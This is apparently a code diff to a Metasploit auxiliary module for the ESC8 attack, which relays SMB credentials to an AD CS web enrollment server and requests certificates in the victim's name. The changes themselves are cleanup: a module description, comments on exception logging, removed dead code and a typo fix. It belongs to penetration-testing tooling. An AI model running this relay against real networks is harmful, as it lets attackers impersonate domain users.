@@ -14,6 +14,10 @@ class MetasploitModule < Msf::Auxiliary
     super({
       'Name' => 'ESC8 Relay: SMB',
       'Description' => %q{
+      This module creates an SMB server and then relays the credentials passed to it
+      to an HTTP server to gain an authenticated connection.  Once that connection is
+      established, the module makes an authenticated request for a certificate based
+      on a given template.
       },
       'Author' => [
         'bwatters-r7',
@@ -75,19 +79,20 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('CSR Generated')
     return request
   rescue Exception => e
+    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
+    # the server running.  This just makes sure that the exception generated is logged from this
+    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
     print_error(e.to_s)
     elog("Error creating certificate request:\n #{e}")
     raise e
-    return nil
   end
 
-  def post_login_action(kwargs = {})e
+  def post_login_action(kwargs = {})
     authenticated_username = kwargs[:authenticated_username]
     client_socket = kwargs[:client_socket]
     if client_socket.nil? || authenticated_username.nil?
       fail_with(Failure::BadConfig, 'Post Login Action requires an authenticated socket and username')
     end
-    vprint_status("authenticated_username = #{kwargs[:authenticated_username]}")
     cert_list = nil
     if datastore['QUERY_TEMPLATES']
       print_status('Querying certificate templates; this may take some time')
@@ -116,10 +121,12 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   rescue Exception => e
+    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
+    # the server running.  This just makes sure that the exception generated is logged from this
+    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
     print_error(e.to_s)
     elog("Error querying certificates:\n #{e}")
     raise e
-    return nil
   end
 
   def get_cert_list(client_socket)
@@ -137,10 +144,12 @@ class MetasploitModule < Msf::Auxiliary
     end
     return user_list
   rescue Exception => e
+    # The goal behind this rescue is that the threadfactory will swallow any exception to keep
+    # the server running.  This just makes sure that the exception generated is logged from this
+    # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
     print_error(e.to_s)
     elog("Error requesting certificate template list:\n #{e}")
     raise e
-    return nil
   end
 
   def retrieve_cert(client_socket, cert_template, authenticated_user)
@@ -173,10 +182,12 @@ class MetasploitModule < Msf::Auxiliary
         return false
       end
     rescue Exception => e
+      # The goal behind this rescue is that the threadfactory will swallow any exception to keep
+      # the server running.  This just makes sure that the exception generated is logged from this
+      # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
       print_error(e.to_s)
       elog("Error sending POST request to generate Certificate: #{e}")
       raise e
-      return nil
     end
     begin
       location_tag = res.body.match(/^.*location="(.*)"/)[1]
@@ -201,10 +212,12 @@ class MetasploitModule < Msf::Auxiliary
                                info)
       print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
     rescue Exception => e
+      # The goal behind this rescue is that the threadfactory will swallow any exception to keep
+      # the server running.  This just makes sure that the exception generated is logged from this
+      # location, too, otherwise, tracing exceptions logged by threadfactory become more difficult.
       print_error(e.to_s)
       elog("Error getting certificate:\n #{e}")
       raise e
-      return nil
     end
     return certificate
   end
